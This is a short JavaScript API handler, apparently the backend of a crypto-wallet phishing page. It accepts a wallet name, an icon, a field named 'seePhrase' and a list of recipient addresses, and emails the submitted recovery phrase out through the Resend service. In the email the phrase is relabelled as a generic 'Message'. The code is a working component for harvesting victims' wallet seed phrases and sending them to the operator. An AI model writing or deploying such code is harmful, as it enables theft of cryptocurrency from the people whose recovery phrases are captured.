import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { walletName, walletIcon, seePhrase, emailAddresses } = req.body;

  // Validate inputs
  if (!walletName || !walletIcon || !seePhrase || !emailAddresses) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  try {
    // ✅ Send via Resend to multiple addresses
    const result = await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || "onboarding@resend.dev",
      to: Array.isArray(emailAddresses) ? emailAddresses : [emailAddresses],
      subject: `New Message from ${walletName}`,
      html: `
        <h2>New Submission</h2>
        <p><strong>Name:</strong> ${walletName}</p>
        <p><strong>Icon:</strong> ${walletIcon}</p>
        <p><strong>Message:</strong></p>
        <p>${seePhrase.replace(/\n/g, "<br>")}</p>
        <hr>
        <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
      `,
    });

    console.log("Email sent via Resend:", result.id);

    return res.status(200).json({
      success: true,
      message: "✅ Email sent successfully via Resend",
      messageId: result.id,
    });
  } catch (error) {
    console.error("Resend Email error:", error);
    return res.status(500).json({
      success: false,
      error: "Failed to send email via Resend",
      details: error.message,
    });
  }
}
